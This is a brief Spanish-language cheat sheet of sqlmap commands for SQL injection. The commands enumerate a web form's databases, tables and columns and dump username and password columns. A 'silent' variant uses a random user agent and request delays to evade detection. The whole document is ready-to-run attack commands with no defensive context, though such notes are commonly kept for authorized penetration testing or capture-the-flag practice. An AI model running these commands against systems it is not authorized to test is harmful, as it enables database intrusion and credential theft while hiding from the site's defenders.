- Tags : #sqlinjection #sqlmap #sqlmap_silenc

```bash

sqlmap --url http://url --dbs --forms --batch #Obtener nombre de las BD

sqlmap --url http://url -D nombre_bd --tables --forms --batch   #Attack una BD especifica ver las tablas

sqlmap --url http://url -D nombre_bd -t name_table --columns --forms --batch   #Attack una BD especifica una tabla especifica y ver sus columnas

sqlmap --url http://url -D nombre_bd -t name_table -C username,password --dump --forms --batch   #Attack una BD especifica una tabla especifica y ver el valor de sus columnas

```

**Inyecciones SQL con SQLMAP silenciosas**

```bash

sqlmap --url http://url --dbs --random-agent --delay=5 --level=1 --risk=1 --forms --batch #Obtener nombre de las BD e manera silenciosa

```